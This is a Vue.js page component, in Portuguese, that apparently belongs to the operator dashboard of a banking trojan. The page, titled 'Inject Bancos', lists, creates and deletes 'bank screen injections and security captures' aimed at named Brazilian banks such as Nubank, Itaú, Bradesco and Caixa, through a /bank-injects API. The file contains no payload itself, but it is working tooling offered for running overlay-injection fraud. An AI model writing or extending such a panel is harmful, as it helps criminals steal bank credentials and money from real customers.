<template>
  <div class="page-container">
    <div class="page-header">
      <div>
        <h1 class="page-title">Inject Bancos 🟦</h1>
        <p class="page-sub">Configure injeções de telas bancárias e capturas de segurança</p>
      </div>
      <button class="btn btn-primary" @click="showModal = true">+ Nova Injeção</button>
    </div>

    <!-- Stats rápidas -->
    <div class="stats-row">
      <div class="stat-card">
        <span class="stat-label">Injeções Ativas</span>
        <span class="stat-value">{{ injects.length }}</span>
      </div>
      <div class="stat-card">
        <span class="stat-label">Bancos Suportados</span>
        <span class="stat-value">12</span>
      </div>
      <div class="stat-card">
        <span class="stat-label">Status</span>
        <span class="stat-value status-ok">Sem Limite</span>
      </div>
    </div>

    <!-- Tabela de Injeções -->
    <div class="card table-card">
      <div class="card-header">
        <h3>Injeções Configuradas</h3>
      </div>
      <div v-if="isLoading" class="loading-state">Carregando injeções...</div>
      <div v-else-if="injects.length === 0" class="empty-state">
        Nenhuma injeção configurada ainda. Clique em "+ Nova Injeção" para cadastrar.
      </div>
      <table v-else class="data-table">
        <thead>
          <tr>
            <th>Banco</th>
            <th>Identificador / Nome</th>
            <th>Status</th>
            <th>Criado em</th>
            <th>Ações</th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="inject in injects" :key="inject.id">
            <td>
              <strong class="bank-name">{{ inject.bank_name || inject.bank }}</strong>
            </td>
            <td><code>{{ inject.name || inject.identifier || 'default' }}</code></td>
            <td><span class="badge badge-success">Ativo</span></td>
            <td>{{ formatDate(inject.created_at) }}</td>
            <td class="actions-cell">
              <button class="btn-sm btn-secondary" @click="deleteInject(inject.id)">Excluir 🗑️</button>
            </td>
          </tr>
        </tbody>
      </table>
    </div>

    <!-- Modal Nova Injeção -->
    <div v-if="showModal" class="modal-backdrop" @click.self="showModal = false">
      <div class="modal-card">
        <div class="modal-header">
          <h3>Nova Injeção Bancária</h3>
          <button class="btn-close" @click="showModal = false">✕</button>
        </div>
        <form @submit.prevent="handleCreateInject">
          <div class="form-group">
            <label>Selecione o Banco</label>
            <select v-model="form.bank_name" required class="select-input">
              <option value="">Selecione...</option>
              <option value="Nubank">Nubank</option>
              <option value="Banco Inter">Banco Inter</option>
              <option value="Itaú">Itaú</option>
              <option value="Bradesco">Bradesco</option>
              <option value="Santander">Santander</option>
              <option value="Caixa">Caixa Econômica</option>
              <option value="Banco do Brasil">Banco do Brasil</option>
              <option value="C6 Bank">C6 Bank</option>
            </select>
          </div>
          <div class="form-group">
            <label>Nome / Identificador</label>
            <input v-model="form.name" type="text" placeholder="Ex: Inject Nubank v2.0" required />
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" @click="showModal = false">Cancelar</button>
            <button type="submit" class="btn btn-primary" :disabled="isSubmitting">
              {{ isSubmitting ? 'Salvando...' : 'Criar Injeção' }}
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue';
import axios from 'axios';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost/api';

const injects = ref<any[]>([]);
const isLoading = ref(true);
const showModal = ref(false);
const isSubmitting = ref(false);

const form = ref({
  bank_name: '',
  name: ''
});

const loadInjects = async () => {
  isLoading.value = true;
  try {
    const res = await axios.get(`${API_URL}/bank-injects`);
    injects.value = res.data.data || res.data || [];
  } catch (err) {
    console.error('Erro ao carregar injeções:', err);
  } finally {
    isLoading.value = false;
  }
};

const handleCreateInject = async () => {
  isSubmitting.value = true;
  try {
    await axios.post(`${API_URL}/bank-injects`, form.value);
    showModal.value = false;
    form.value = { bank_name: '', name: '' };
    await loadInjects();
  } catch (err) {
    alert('Erro ao criar injeção.');
  } finally {
    isSubmitting.value = false;
  }
};

const deleteInject = async (id: number) => {
  if (!confirm('Deseja excluir esta injeção bancária?')) return;
  try {
    await axios.delete(`${API_URL}/bank-injects/${id}`);
    await loadInjects();
  } catch (err) {
    alert('Erro ao excluir injeção.');
  }
};

const formatDate = (dateStr: string) => {
  if (!dateStr) return '-';
  return new Date(dateStr).toLocaleDateString('pt-BR');
};

onMounted(() => {
  loadInjects();
});
</script>

<style scoped>
.page-container { display: flex; flex-direction: column; gap: 1.5rem; }
.page-header { display: flex; align-items: center; justify-content: space-between; }
.page-title { font-family: var(--font-display); font-size: 1.5rem; font-weight: 700; color: var(--ink); }
.page-sub { font-size: 0.875rem; color: var(--ink-muted); }

.stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; }
.stat-card { background: var(--surface-1); border: 1px solid var(--hairline); padding: 1.25rem; border-radius: var(--r-md); display: flex; flex-direction: column; gap: 0.25rem; }
.stat-label { font-size: 0.75rem; color: var(--ink-muted); text-transform: uppercase; letter-spacing: 0.05em; }
.stat-value { font-family: var(--font-display); font-size: 1.5rem; font-weight: 700; color: var(--ink); }
.status-ok { color: var(--success); }

.card { background: var(--surface-1); border: 1px solid var(--hairline); border-radius: var(--r-lg); overflow: hidden; }
.card-header { padding: 1.25rem; border-bottom: 1px solid var(--hairline); }
.card-header h3 { font-size: 1rem; font-weight: 600; color: var(--ink); }

.loading-state, .empty-state { padding: 3rem; text-align: center; color: var(--ink-muted); }

.data-table { width: 100%; border-collapse: collapse; text-align: left; font-size: 0.875rem; }
.data-table th { padding: 0.75rem 1.25rem; background: var(--surface-2); color: var(--ink-muted); font-weight: 600; border-bottom: 1px solid var(--hairline); }
.data-table td { padding: 1rem 1.25rem; border-bottom: 1px solid var(--hairline); color: var(--ink); }

.bank-name { color: var(--accent); }
.badge { font-size: 0.7rem; font-weight: 600; padding: 0.25rem 0.5rem; border-radius: var(--r-pill); }
.badge-success { background: var(--success-soft); color: var(--success); }

.btn { padding: 0.6rem 1.2rem; border-radius: var(--r-sm); font-weight: 600; border: none; cursor: pointer; transition: opacity 0.2s; }
.btn-primary { background: var(--accent); color: white; }
.btn-secondary { background: var(--surface-2); color: var(--ink); border: 1px solid var(--hairline); }
.btn-sm { padding: 0.35rem 0.75rem; font-size: 0.75rem; border-radius: var(--r-sm); border: none; cursor: pointer; }

.modal-backdrop { position: fixed; inset: 0; background: oklch(0 0 0 / 60%); display: flex; align-items: center; justify-content: center; z-index: 100; }
.modal-card { background: var(--surface-1); border: 1px solid var(--hairline); border-radius: var(--r-lg); width: 100%; max-width: 480px; padding: 1.5rem; box-shadow: var(--shadow-modal); }
.modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.25rem; }
.btn-close { background: none; border: none; color: var(--ink-muted); font-size: 1.25rem; cursor: pointer; }

.form-group { display: flex; flex-direction: column; gap: 0.5rem; margin-bottom: 1rem; }
.form-group label { font-size: 0.85rem; font-weight: 500; color: var(--ink-muted); }
.form-group input, .select-input { padding: 0.65rem; background: var(--surface-2); border: 1px solid var(--hairline); border-radius: var(--r-sm); color: var(--ink); outline: none; }
.form-group input:focus, .select-input:focus { border-color: var(--accent); }

.modal-footer { display: flex; justify-content: flex-end; gap: 0.75rem; margin-top: 1.5rem; }
</style>